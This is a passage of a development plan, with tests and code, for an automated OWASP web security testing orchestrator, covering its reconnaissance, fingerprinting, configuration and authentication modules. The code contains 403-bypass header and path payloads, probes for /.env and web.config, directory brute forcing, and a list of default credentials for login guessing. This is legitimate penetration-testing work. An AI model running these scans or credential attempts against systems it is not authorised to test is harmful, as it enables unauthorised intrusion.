            parsed = urlparse(url if "://" in url else f"http://{url}")
            if parsed.hostname:
                all_subdomains.append(parsed.hostname)

        all_subdomains = list(set(self._filter_in_scope(all_subdomains)))
        all_urls = list(set(self._filter_in_scope(all_urls)))

        self.state.enrich("discovered_subdomains", all_subdomains)
        self.state.enrich("endpoints", all_urls)
        self.evidence.log_parsed("reconnaissance", "subdomains", all_subdomains)
        self.evidence.log_parsed("reconnaissance", "historical_urls", all_urls)
        self.logger.info(f"Found {len(all_subdomains)} subdomains, {len(all_urls)} URLs")

    async def _run_subfinder(self) -> list[str]:
        result = self._cmd.run(
            "subfinder", ["-d", self.config.base_domain, "-silent"], timeout=300,
        )
        if result.tool_missing:
            self.logger.warning("subfinder not found, trying amass")
            return await self._run_amass()
        if result.returncode == 0:
            self.evidence.log_tool_output("reconnaissance", "subfinder", result.stdout)
            return [line.strip() for line in result.stdout.splitlines() if line.strip()]
        return []

    async def _run_amass(self) -> list[str]:
        result = self._cmd.run(
            "amass", ["enum", "-passive", "-d", self.config.base_domain], timeout=600,
        )
        if result.tool_missing:
            self.logger.warning("amass not found, skipping subdomain enumeration tools")
            return []
        if result.returncode == 0:
            self.evidence.log_tool_output("reconnaissance", "amass", result.stdout)
            return [line.strip() for line in result.stdout.splitlines() if line.strip()]
        return []

    async def _run_gau(self) -> list[str]:
        result = self._cmd.run(
            "gau", [self.config.base_domain, "--subs"], timeout=300,
        )
        if result.tool_missing:
            self.logger.warning("gau not found, skipping URL harvesting from gau")
            return []
        if result.returncode == 0:
            self.evidence.log_tool_output("reconnaissance", "gau", result.stdout)
            return [line.strip() for line in result.stdout.splitlines() if line.strip()]
        return []

    async def _run_wayback(self) -> list[str]:
        # Wayback Machine CDX API - no external tool needed
        try:
            from wstg_orchestrator.utils.http_utils import HttpClient
            # Use raw requests to avoid scope check on archive.org
            import requests
            resp = requests.get(
                f"https://web.archive.org/cdx/search/cdx?url=*.{self.config.base_domain}/*&output=text&fl=original&collapse=urlkey",
                timeout=60,
            )
            if resp.status_code == 200:
                urls = [line.strip() for line in resp.text.splitlines() if line.strip()]
                self.evidence.log_tool_output("reconnaissance", "wayback", resp.text)
                return urls
        except Exception as e:
            self.logger.warning(f"Wayback fetch failed: {e}")
        return []

    async def _live_host_validation(self):
        self.logger.info("Starting live host validation")
        subdomains = self.state.get("discovered_subdomains") or []
        if not subdomains:
            subdomains = [self.config.base_domain]

        live_hosts = []
        technologies = []

        if self._cmd.is_tool_available("httpx"):
            live_hosts, technologies = await self._run_httpx(subdomains)
        else:
            self.logger.warning("httpx not found, using fallback HTTP probing")
            live_hosts, technologies = await self._fallback_probe(subdomains)

        self.state.enrich("live_hosts", live_hosts)
        self.state.enrich("technologies", technologies)
        self.evidence.log_parsed("reconnaissance", "live_hosts", live_hosts)
        self.logger.info(f"Found {len(live_hosts)} live hosts")

    async def _run_httpx(self, subdomains: list[str]) -> tuple[list[str], list[str]]:
        import tempfile, os
        fd, input_file = tempfile.mkstemp(suffix=".txt")
        with os.fdopen(fd, "w") as f:
            f.write("\n".join(subdomains))

        result = self._cmd.run(
            "httpx", ["-l", input_file, "-silent", "-tech-detect", "-status-code", "-json"],
            timeout=600,
        )
        os.unlink(input_file)

        live = []
        techs = []
        if result.returncode == 0:
            self.evidence.log_tool_output("reconnaissance", "httpx", result.stdout)
            import json
            for line in result.stdout.splitlines():
                if not line.strip():
                    continue
                try:
                    entry = json.loads(line)
                    url = entry.get("url", "")
                    if url:
                        live.append(url)
                    for tech in entry.get("tech", []):
                        techs.append(tech)
                except json.JSONDecodeError:
                    if line.strip():
                        live.append(line.strip())
        return live, list(set(techs))

    async def _fallback_probe(self, subdomains: list[str]) -> tuple[list[str], list[str]]:
        import requests
        live = []
        techs = []
        for sub in subdomains:
            for scheme in ["https", "http"]:
                try:
                    resp = requests.get(f"{scheme}://{sub}", timeout=10, allow_redirects=True)
                    live.append(f"{scheme}://{sub}")
                    server = resp.headers.get("Server", "")
                    if server:
                        techs.append(server)
                    powered = resp.headers.get("X-Powered-By", "")
                    if powered:
                        techs.append(powered)
                    break
                except Exception:
                    continue
        return live, list(set(techs))

    async def _parameter_harvesting(self):
        self.logger.info("Starting parameter harvesting")
        endpoints = self.state.get("endpoints") or []
        live_hosts = self.state.get("live_hosts") or []

        all_params = []
        idor_candidates = []

        # Extract params from known URLs
        for url in endpoints:
            params = extract_params_from_url(url)
            for name, value in params.items():
                all_params.append({"url": url, "name": name, "value": value, "method": "GET"})

        # Detect ID patterns
        id_patterns = detect_id_patterns(endpoints + live_hosts)
        for pattern in id_patterns:
            idor_candidates.append(pattern)

        # TODO: JS file parsing for hidden endpoints
        # TODO: Form extraction from live hosts

        self.state.enrich("parameters", all_params)
        self.state.enrich("potential_idor_candidates", idor_candidates)
        self.evidence.log_parsed("reconnaissance", "parameters", all_params)
        self.evidence.log_parsed("reconnaissance", "idor_candidates", idor_candidates)
        self.logger.info(f"Found {len(all_params)} parameters, {len(idor_candidates)} IDOR candidates")

    def _filter_in_scope(self, items: list[str]) -> list[str]:
        return [item for item in items if self.scope.is_in_scope(item)]
```

**Step 4: Run tests**

```bash
pytest tests/test_reconnaissance.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/reconnaissance.py tests/test_reconnaissance.py
git commit -m "feat: implement ReconModule with subdomain enum, live probing, and param harvesting"
```

---

## Task 14: Fingerprinting Module

**Files:**
- Create: `wstg_orchestrator/modules/fingerprinting.py`
- Create: `tests/test_fingerprinting.py`

**Step 1: Write failing tests**

```python
# tests/test_fingerprinting.py
import pytest
from unittest.mock import MagicMock, AsyncMock, patch
from wstg_orchestrator.modules.fingerprinting import FingerprintingModule


@pytest.fixture
def fp_module():
    state = MagicMock()
    state.get.side_effect = lambda key: {
        "live_hosts": ["https://app.example.com"],
        "technologies": ["nginx"],
        "server_versions": [],
        "frameworks": [],
        "inferred_cves": [],
    }.get(key, [])
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    scope = MagicMock()
    scope.is_in_scope.return_value = True
    limiter = MagicMock()
    evidence = MagicMock()
    evidence.log_tool_output.return_value = "/tmp/test"
    evidence.log_parsed.return_value = "/tmp/test"
    evidence.log_request.return_value = "/tmp/test"
    evidence.log_response.return_value = "/tmp/test"
    callback = MagicMock()
    return FingerprintingModule(state, config, scope, limiter, evidence, callback)


def test_phase_name(fp_module):
    assert fp_module.PHASE_NAME == "fingerprinting"


def test_subcategories(fp_module):
    assert "service_scanning" in fp_module.SUBCATEGORIES
    assert "header_analysis" in fp_module.SUBCATEGORIES
    assert "cve_correlation" in fp_module.SUBCATEGORIES


@pytest.mark.asyncio
async def test_header_analysis_extracts_server(fp_module):
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"Server": "Apache/2.4.51", "X-Powered-By": "PHP/8.1.0"}
    mock_resp.text = ""
    mock_resp.content = b""
    mock_resp.url = "https://app.example.com"
    mock_resp.elapsed = 0.5
    mock_resp.request_method = "GET"
    mock_resp.request_url = "https://app.example.com"
    mock_resp.request_headers = {}
    mock_resp.request_body = None

    with patch.object(fp_module, '_make_request', new_callable=AsyncMock, return_value=mock_resp):
        results = await fp_module._analyze_headers("https://app.example.com")
        assert any("Apache" in v for v in results["server_versions"])
        assert any("PHP" in v for v in results["frameworks"])


@pytest.mark.asyncio
async def test_nmap_parsing(fp_module):
    nmap_xml = '''<?xml version="1.0"?>
    <nmaprun>
        <host>
            <address addr="93.184.216.34" addrtype="ipv4"/>
            <ports>
                <port protocol="tcp" portid="443">
                    <state state="open"/>
                    <service name="https" product="nginx" version="1.21.0"/>
                </port>
            </ports>
        </host>
    </nmaprun>'''
    results = fp_module._parse_nmap_xml(nmap_xml)
    assert any(p["port"] == 443 for p in results["ports"])
    assert any("nginx" in v for v in results["server_versions"])
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_fingerprinting.py -v
```

**Step 3: Implement FingerprintingModule**

```python
# wstg_orchestrator/modules/fingerprinting.py
import json
import re
import xml.etree.ElementTree as ET

from wstg_orchestrator.modules.base_module import BaseModule
from wstg_orchestrator.utils.command_runner import CommandRunner


class FingerprintingModule(BaseModule):
    PHASE_NAME = "fingerprinting"
    SUBCATEGORIES = ["service_scanning", "header_analysis", "error_analysis", "cve_correlation"]
    EVIDENCE_SUBDIRS = [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._cmd = CommandRunner(
            tool_configs={
                name: self.config.get_tool_config(name)
                for name in ["nmap", "whatweb"]
            }
        )

    async def execute(self):
        if not self.should_skip_subcategory("service_scanning"):
            await self._service_scanning()
            self.mark_subcategory_complete("service_scanning")

        if not self.should_skip_subcategory("header_analysis"):
            await self._header_analysis()
            self.mark_subcategory_complete("header_analysis")

        if not self.should_skip_subcategory("error_analysis"):
            await self._error_analysis()
            self.mark_subcategory_complete("error_analysis")

        if not self.should_skip_subcategory("cve_correlation"):
            await self._cve_correlation()
            self.mark_subcategory_complete("cve_correlation")

    async def _service_scanning(self):
        self.logger.info("Starting service scanning")
        live_hosts = self.state.get("live_hosts") or []
        all_ports = []
        all_versions = []

        # Extract hostnames for nmap
        from urllib.parse import urlparse
        hosts = list(set(urlparse(h).hostname for h in live_hosts if urlparse(h).hostname))

        if hosts and self._cmd.is_tool_available("nmap"):
            for host in hosts:
                result = self._cmd.run(
                    "nmap", ["-sV", "-oX", "-", host], timeout=300,
                )
                if result.returncode == 0:
                    self.evidence.log_tool_output("fingerprinting", f"nmap_{host}", result.stdout)
                    parsed = self._parse_nmap_xml(result.stdout)
                    all_ports.extend(parsed["ports"])
                    all_versions.extend(parsed["server_versions"])
        else:
            self.logger.warning("nmap not available or no hosts to scan")

        # WhatWeb integration
        if self._cmd.is_tool_available("whatweb"):
            for host_url in live_hosts[:20]:  # limit to first 20
                result = self._cmd.run(
                    "whatweb", ["--color=never", "-q", "--log-json=-", host_url], timeout=60,
                )
                if result.returncode == 0:
                    self.evidence.log_tool_output("fingerprinting", "whatweb", result.stdout)
                    try:
                        for line in result.stdout.splitlines():
                            if line.strip():
                                entry = json.loads(line)
                                for plugin_name, plugin_data in entry.get("plugins", {}).items():
                                    versions = plugin_data.get("version", [])
                                    for v in versions:
                                        all_versions.append(f"{plugin_name}/{v}")
                    except (json.JSONDecodeError, AttributeError):
                        pass

        self.state.enrich("open_ports", all_ports)
        self.state.enrich("server_versions", list(set(all_versions)))
        self.evidence.log_parsed("fingerprinting", "service_scan_results", {
            "ports": all_ports, "versions": list(set(all_versions)),
        })

    def _parse_nmap_xml(self, xml_str: str) -> dict:
        ports = []
        versions = []
        try:
            root = ET.fromstring(xml_str)
            for host in root.findall(".//host"):
                addr_el = host.find("address")
                addr = addr_el.get("addr", "") if addr_el is not None else ""
                for port_el in host.findall(".//port"):
                    port_id = int(port_el.get("portid", 0))
                    protocol = port_el.get("protocol", "tcp")
                    state_el = port_el.find("state")
                    state = state_el.get("state", "") if state_el is not None else ""
                    service_el = port_el.find("service")
                    service_name = ""
                    product = ""
                    version = ""
                    if service_el is not None:
                        service_name = service_el.get("name", "")
                        product = service_el.get("product", "")
                        version = service_el.get("version", "")
                    ports.append({
                        "host": addr, "port": port_id, "protocol": protocol,
                        "state": state, "service": service_name,
                        "product": product, "version": version,
                    })
                    if product:
                        ver_str = f"{product}/{version}" if version else product
                        versions.append(ver_str)
        except ET.ParseError as e:
            self.logger.warning(f"Failed to parse nmap XML: {e}")
        return {"ports": ports, "server_versions": versions}

    async def _header_analysis(self):
        self.logger.info("Starting header analysis")
        live_hosts = self.state.get("live_hosts") or []
        all_versions = []
        all_frameworks = []

        for host_url in live_hosts:
            try:
                resp = await self._make_request(host_url)
                results = await self._analyze_headers(host_url, response=resp)
                all_versions.extend(results.get("server_versions", []))
                all_frameworks.extend(results.get("frameworks", []))
            except Exception as e:
                self.logger.debug(f"Header analysis failed for {host_url}: {e}")

        self.state.enrich("server_versions", list(set(all_versions)))
        self.state.enrich("frameworks", list(set(all_frameworks)))

    async def _make_request(self, url: str):
        from wstg_orchestrator.utils.http_utils import HttpClient
        from wstg_orchestrator.utils.scope_checker import ScopeChecker
        from wstg_orchestrator.utils.rate_limit_handler import RateLimiter
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.get(url)

    async def _analyze_headers(self, url: str, response=None) -> dict:
        versions = []
        frameworks = []

        if response is None:
            response = await self._make_request(url)

        headers = response.headers if hasattr(response, 'headers') else {}

        server = headers.get("Server", "")
        if server:
            versions.append(server)

        powered_by = headers.get("X-Powered-By", "")
        if powered_by:
            frameworks.append(powered_by)

        asp_version = headers.get("X-AspNet-Version", "")
        if asp_version:
            frameworks.append(f"ASP.NET/{asp_version}")

        generator = headers.get("X-Generator", "")
        if generator:
            frameworks.append(generator)

        # Cookie analysis for framework hints
        set_cookie = headers.get("Set-Cookie", "")
        if "PHPSESSID" in set_cookie:
            frameworks.append("PHP")
        if "JSESSIONID" in set_cookie:
            frameworks.append("Java")
        if "ASP.NET" in set_cookie:
            frameworks.append("ASP.NET")
        if "laravel_session" in set_cookie:
            frameworks.append("Laravel")
        if "csrftoken" in set_cookie and "django" not in str(frameworks).lower():
            frameworks.append("Django (possible)")

        self.evidence.log_request("fingerprinting", {"method": "GET", "url": url})
        self.evidence.log_response("fingerprinting", {
            "url": url, "status": response.status_code,
            "headers": dict(headers),
        })

        return {"server_versions": versions, "frameworks": frameworks}

    async def _error_analysis(self):
        self.logger.info("Starting error analysis")
        live_hosts = self.state.get("live_hosts") or []
        error_paths = [
            "/nonexistent_path_" + "x" * 50,
            "/%00", "/~", "/..;/",
            "/index.php.bak", "/web.config", "/.env",
        ]

        for host_url in live_hosts[:10]:
            for path in error_paths:
                try:
                    resp = await self._make_request(f"{host_url.rstrip('/')}{path}")
                    if resp.status_code in [500, 502, 503]:
                        # Check for stack traces or version info
                        body = resp.text if hasattr(resp, 'text') else ""
                        stack_patterns = [
                            r"(Traceback.*?(?:Error|Exception).*?)(?:\n\n|\Z)",
                            r"(at\s+[\w\.$]+\([\w\.]+:\d+\))",
                            r"(Version:\s*[\d\.]+)",
                            r"(PHP (?:Fatal|Warning|Notice).*)",
                        ]
                        for pattern in stack_patterns:
                            matches = re.findall(pattern, body, re.DOTALL)
                            if matches:
                                self.evidence.log_potential_exploit("fingerprinting", {
                                    "type": "information_disclosure",
                                    "url": f"{host_url}{path}",
                                    "details": matches[0][:500],
                                    "severity": "low",
                                })
                except Exception:
                    continue

    async def _cve_correlation(self):
        self.logger.info("Starting CVE correlation")
        versions = self.state.get("server_versions") or []
        all_cves = []

        for version_str in versions:
            try:
                import requests as req_lib
                # Use NIST NVD API or cve.circl.lu
                parts = version_str.split("/")
                if len(parts) >= 2:
                    product = parts[0].lower()
                    version = parts[1]
                    resp = req_lib.get(
                        f"https://cve.circl.lu/api/search/{product}",
                        timeout=15,
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        if isinstance(data, list):
                            for cve in data[:5]:  # top 5 per product
                                cve_id = cve.get("id", "")
                                summary = cve.get("summary", "")
                                all_cves.append({
                                    "cve_id": cve_id,
                                    "product": version_str,
                                    "summary": summary[:200],
                                })
            except Exception as e:
                self.logger.debug(f"CVE lookup failed for {version_str}: {e}")

        if all_cves:
            self.state.enrich("inferred_cves", all_cves)
            self.evidence.log_parsed("fingerprinting", "inferred_cves", all_cves)
            self.logger.info(f"Found {len(all_cves)} potential CVEs")
```

**Step 4: Run tests**

```bash
pytest tests/test_fingerprinting.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/fingerprinting.py tests/test_fingerprinting.py
git commit -m "feat: implement FingerprintingModule with nmap, header analysis, and CVE correlation"
```

---

## Task 15: Configuration Testing Module

**Files:**
- Create: `wstg_orchestrator/modules/configuration_testing.py`
- Create: `tests/test_configuration_testing.py`

**Step 1: Write failing tests**

```python
# tests/test_configuration_testing.py
import pytest
from unittest.mock import MagicMock, AsyncMock, patch
from wstg_orchestrator.modules.configuration_testing import ConfigTestingModule


@pytest.fixture
def config_module():
    state = MagicMock()
    state.get.side_effect = lambda key: {
        "live_hosts": ["https://app.example.com"],
        "endpoints": [],
        "exposed_admin_paths": [],
        "cloud_assets": [],
    }.get(key, [])
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    config.custom_headers = {}
    scope = MagicMock()
    scope.is_in_scope.return_value = True
    scope.is_attack_vector_allowed.return_value = True
    limiter = MagicMock()
    evidence = MagicMock()
    evidence.log_tool_output.return_value = "/tmp/test"
    evidence.log_parsed.return_value = "/tmp/test"
    evidence.log_request.return_value = "/tmp/test"
    evidence.log_response.return_value = "/tmp/test"
    evidence.log_potential_exploit.return_value = "/tmp/test"
    callback = MagicMock()
    return ConfigTestingModule(state, config, scope, limiter, evidence, callback)


def test_phase_name(config_module):
    assert config_module.PHASE_NAME == "configuration_testing"


def test_subcategories(config_module):
    assert "metafile_testing" in config_module.SUBCATEGORIES
    assert "http_method_testing" in config_module.SUBCATEGORIES
    assert "cloud_storage_enum" in config_module.SUBCATEGORIES


def test_parse_robots_txt(config_module):
    robots = "User-agent: *\nDisallow: /admin/\nDisallow: /secret/\nAllow: /public/"
    paths = config_module._parse_robots_txt(robots)
    assert "/admin/" in paths
    assert "/secret/" in paths


def test_detect_cloud_patterns(config_module):
    urls = [
        "https://mybucket.s3.amazonaws.com/file",
        "https://storage.googleapis.com/mybucket/file",
        "https://myaccount.blob.core.windows.net/container/file",
        "https://normal.example.com/page",
    ]
    cloud = config_module._detect_cloud_patterns(urls)
    assert len(cloud) == 3
    assert any(c["provider"] == "aws_s3" for c in cloud)
    assert any(c["provider"] == "gcs" for c in cloud)
    assert any(c["provider"] == "azure_blob" for c in cloud)
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_configuration_testing.py -v
```

**Step 3: Implement ConfigTestingModule**

```python
# wstg_orchestrator/modules/configuration_testing.py
import re

from wstg_orchestrator.modules.base_module import BaseModule
from wstg_orchestrator.utils.command_runner import CommandRunner


CLOUD_PATTERNS = [
    (r'[\w\-]+\.s3[\.\-](?:[\w\-]+\.)?amazonaws\.com', "aws_s3"),
    (r's3://[\w\-]+', "aws_s3"),
    (r'storage\.googleapis\.com/[\w\-]+', "gcs"),
    (r'[\w\-]+\.storage\.googleapis\.com', "gcs"),
    (r'[\w\-]+\.blob\.core\.windows\.net', "azure_blob"),
]

BYPASS_403_HEADERS = [
    {"X-Original-URL": "/{path}"},
    {"X-Rewrite-URL": "/{path}"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

BYPASS_403_PATHS = [
    "/{path}/.",
    "/{path}//",
    "/{path}%20",
    "/{path}%09",
    "/{path}..;/",
    "/{path};",
]


class ConfigTestingModule(BaseModule):
    PHASE_NAME = "configuration_testing"
    SUBCATEGORIES = [
        "metafile_testing", "directory_bruteforce",
        "http_method_testing", "cloud_storage_enum",
    ]
    EVIDENCE_SUBDIRS = [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._cmd = CommandRunner(
            tool_configs={
                name: self.config.get_tool_config(name)
                for name in ["gobuster", "dirsearch"]
            }
        )

    async def execute(self):
        if not self.should_skip_subcategory("metafile_testing"):
            await self._metafile_testing()
            self.mark_subcategory_complete("metafile_testing")

        if not self.should_skip_subcategory("directory_bruteforce"):
            await self._directory_bruteforce()
            self.mark_subcategory_complete("directory_bruteforce")

        if not self.should_skip_subcategory("http_method_testing"):
            await self._http_method_testing()
            self.mark_subcategory_complete("http_method_testing")

        if not self.should_skip_subcategory("cloud_storage_enum"):
            await self._cloud_storage_enum()
            self.mark_subcategory_complete("cloud_storage_enum")

    async def _metafile_testing(self):
        self.logger.info("Starting metafile testing")
        live_hosts = self.state.get("live_hosts") or []
        all_paths = []

        for host_url in live_hosts:
            base = host_url.rstrip("/")
            # robots.txt
            try:
                resp = self._http_get(f"{base}/robots.txt")
                if resp.status_code == 200 and "disallow" in resp.text.lower():
                    paths = self._parse_robots_txt(resp.text)
                    all_paths.extend(paths)
                    self.evidence.log_tool_output("configuration_testing", f"robots_{base}", resp.text)
            except Exception:
                pass

            # sitemap.xml
            try:
                resp = self._http_get(f"{base}/sitemap.xml")
                if resp.status_code == 200 and "<url" in resp.text.lower():
                    urls = re.findall(r'<loc>(.*?)</loc>', resp.text)
                    self.state.enrich("endpoints", urls)
                    self.evidence.log_tool_output("configuration_testing", f"sitemap_{base}", resp.text)
            except Exception:
                pass

        if all_paths:
            self.state.enrich("exposed_admin_paths", all_paths)
            self.evidence.log_parsed("configuration_testing", "robots_paths", all_paths)

    def _parse_robots_txt(self, content: str) -> list[str]:
        paths = []
        for line in content.splitlines():
            line = line.strip()
            if line.lower().startswith("disallow:"):
                path = line.split(":", 1)[1].strip()
                if path and path != "/":
                    paths.append(path)
        return paths

    async def _directory_bruteforce(self):
        self.logger.info("Starting directory brute forcing")
        live_hosts = self.state.get("live_hosts") or []
        found_paths = []

        for host_url in live_hosts[:5]:  # Limit to first 5 hosts
            if self._cmd.is_tool_available("gobuster"):
                result = self._cmd.run(
                    "gobuster",
                    ["dir", "-u", host_url, "-w", "/usr/share/wordlists/dirb/common.txt",
                     "-q", "--no-color", "-t", "10"],
                    timeout=300,
                )
                if result.returncode == 0:
                    self.evidence.log_tool_output("configuration_testing", "gobuster", result.stdout)
                    for line in result.stdout.splitlines():
                        if "(Status:" in line:
                            path_match = re.match(r'(/\S+)', line)
                            if path_match:
                                found_path = path_match.group(1)
                                found_paths.append(f"{host_url.rstrip('/')}{found_path}")
                                status_match = re.search(r'Status:\s*(\d+)', line)
                                if status_match and status_match.group(1) == "403":
                                    await self._try_403_bypass(host_url, found_path)
            else:
                self.logger.warning("gobuster not found, skipping directory brute force")

        if found_paths:
            self.state.enrich("endpoints", found_paths)

    async def _try_403_bypass(self, base_url: str, path: str):
        base = base_url.rstrip("/")
        # Header-based bypasses
        for header_template in BYPASS_403_HEADERS:
            headers = {k: v.format(path=path) for k, v in header_template.items()}
            try:
                resp = self._http_get(f"{base}{path}", extra_headers=headers)
                if resp.status_code == 200:
                    self.evidence.log_potential_exploit("configuration_testing", {
                        "type": "403_bypass",
                        "url": f"{base}{path}",
                        "bypass_method": str(headers),
                        "severity": "medium",
                    })
                    self.state.enrich("potential_vulnerabilities", [{
                        "type": "403_bypass", "url": f"{base}{path}",
                        "severity": "medium",
                        "description": f"403 bypass via headers: {headers}",
                    }])
            except Exception:
                continue

        # Path-based bypasses
        for path_template in BYPASS_403_PATHS:
            bypass_path = path_template.format(path=path.rstrip("/"))
            try:
                resp = self._http_get(f"{base}{bypass_path}")
                if resp.status_code == 200:
                    self.evidence.log_potential_exploit("configuration_testing", {
                        "type": "403_bypass",
                        "url": f"{base}{bypass_path}",
                        "bypass_method": f"path: {bypass_path}",
                        "severity": "medium",
                    })
            except Exception:
                continue

    async def _http_method_testing(self):
        self.logger.info("Starting HTTP method testing")
        live_hosts = self.state.get("live_hosts") or []

        for host_url in live_hosts:
            # OPTIONS request
            try:
                resp = self._http_request("OPTIONS", host_url)
                allow = resp.headers.get("Allow", "")
                if allow:
                    self.evidence.log_parsed("configuration_testing", f"methods_{host_url}", {
                        "url": host_url, "allowed_methods": allow,
                    })
                    # Check for dangerous methods
                    dangerous = {"PUT", "DELETE", "TRACE"}
                    allowed_set = {m.strip().upper() for m in allow.split(",")}
                    found_dangerous = dangerous & allowed_set

                    if found_dangerous:
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "dangerous_http_methods",
                            "url": host_url,
                            "methods": list(found_dangerous),
                            "severity": "medium",
                            "description": f"Dangerous HTTP methods enabled: {found_dangerous}",
                        }])

                    # TRACE XST test
                    if "TRACE" in allowed_set:
                        trace_resp = self._http_request("TRACE", host_url)
                        if trace_resp.status_code == 200 and "TRACE" in trace_resp.text:
                            self.evidence.log_confirmed_exploit("configuration_testing", {
                                "type": "xst",
                                "url": host_url,
                                "severity": "low",
                                "description": "Cross-Site Tracing (XST) - TRACE method reflects request",
                            })
            except Exception as e:
                self.logger.debug(f"Method testing failed for {host_url}: {e}")

    async def _cloud_storage_enum(self):
        self.logger.info("Starting cloud storage enumeration")
        endpoints = self.state.get("endpoints") or []
        live_hosts = self.state.get("live_hosts") or []
        all_urls = endpoints + live_hosts

        cloud_assets = self._detect_cloud_patterns(all_urls)

        # Test public access for each detected asset
        for asset in cloud_assets:
            try:
                resp = self._http_get(asset["url"])
                asset["public_read"] = resp.status_code == 200
                if resp.status_code == 200:
                    self.evidence.log_potential_exploit("configuration_testing", {
                        "type": "public_cloud_storage",
                        "url": asset["url"],
                        "provider": asset["provider"],
                        "severity": "high",
                        "description": f"Publicly readable {asset['provider']} storage",
                    })
                    self.state.enrich("potential_vulnerabilities", [{
                        "type": "public_cloud_storage",
                        "url": asset["url"],
                        "severity": "high",
                        "description": f"Publicly readable {asset['provider']} storage",
                    }])
            except Exception:
                asset["public_read"] = False

        if cloud_assets:
            self.state.enrich("cloud_assets", cloud_assets)
            self.evidence.log_parsed("configuration_testing", "cloud_assets", cloud_assets)

    def _detect_cloud_patterns(self, urls: list[str]) -> list[dict]:
        found = []
        for url in urls:
            for pattern, provider in CLOUD_PATTERNS:
                if re.search(pattern, url, re.I):
                    found.append({"url": url, "provider": provider})
                    break
        return found

    def _http_get(self, url: str, extra_headers: dict | None = None):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.get(url, headers=extra_headers)

    def _http_request(self, method: str, url: str):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.request(method, url)
```

**Step 4: Run tests**

```bash
pytest tests/test_configuration_testing.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/configuration_testing.py tests/test_configuration_testing.py
git commit -m "feat: implement ConfigTestingModule with metafiles, dir brute, method testing, cloud enum"
```

---

## Task 16: Auth Testing Module

**Files:**
- Create: `wstg_orchestrator/modules/auth_testing.py`
- Create: `tests/test_auth_testing.py`

**Step 1: Write failing tests**

```python
# tests/test_auth_testing.py
import pytest
from unittest.mock import MagicMock, AsyncMock, patch
from wstg_orchestrator.modules.auth_testing import AuthTestingModule


@pytest.fixture
def auth_module():
    state = MagicMock()
    state.get.side_effect = lambda key: {
        "live_hosts": ["https://app.example.com"],
        "auth_endpoints": ["https://app.example.com/login"],
        "valid_usernames": [],
    }.get(key, [])
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    config.custom_headers = {}
    scope = MagicMock()
    scope.is_in_scope.return_value = True
    scope.is_attack_vector_allowed.return_value = True
    limiter = MagicMock()
    evidence = MagicMock()
    evidence.log_tool_output.return_value = "/tmp/test"
    evidence.log_parsed.return_value = "/tmp/test"
    evidence.log_request.return_value = "/tmp/test"
    evidence.log_response.return_value = "/tmp/test"
    evidence.log_potential_exploit.return_value = "/tmp/test"
    evidence.log_confirmed_exploit.return_value = "/tmp/test"
    callback = MagicMock()
    return AuthTestingModule(state, config, scope, limiter, evidence, callback)


def test_phase_name(auth_module):
    assert auth_module.PHASE_NAME == "auth_testing"


def test_subcategories(auth_module):
    assert "username_enumeration" in auth_module.SUBCATEGORIES
    assert "default_credentials" in auth_module.SUBCATEGORIES
    assert "lockout_testing" in auth_module.SUBCATEGORIES


def test_default_credentials_list(auth_module):
    creds = auth_module.DEFAULT_CREDENTIALS
    assert ("admin", "admin") in creds
    assert ("root", "root") in creds


def test_detect_username_enum_by_response_diff(auth_module):
    resp_valid = MagicMock()
    resp_valid.text = "Invalid password for this account"
    resp_valid.status_code = 200
    resp_valid.elapsed = 0.2

    resp_invalid = MagicMock()
    resp_invalid.text = "User does not exist"
    resp_invalid.status_code = 200
    resp_invalid.elapsed = 0.2

    result = auth_module._detect_enum_by_diff(resp_valid, resp_invalid)
    assert result["enumerable"] is True
    assert result["method"] == "response_content"
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_auth_testing.py -v
```

**Step 3: Implement AuthTestingModule**

```python
# wstg_orchestrator/modules/auth_testing.py
import time
import statistics

from wstg_orchestrator.modules.base_module import BaseModule
from wstg_orchestrator.utils.parser_utils import diff_responses


class AuthTestingModule(BaseModule):
    PHASE_NAME = "auth_testing"
    SUBCATEGORIES = ["username_enumeration", "default_credentials", "lockout_testing"]
    EVIDENCE_SUBDIRS = [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ]

    DEFAULT_CREDENTIALS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
        ("admin", "12345"), ("root", "root"), ("root", "toor"),
        ("root", "password"), ("test", "test"), ("user", "user"),
        ("guest", "guest"), ("admin", "changeme"), ("admin", ""),
        ("administrator", "administrator"), ("admin", "P@ssw0rd"),
    ]

    async def execute(self):
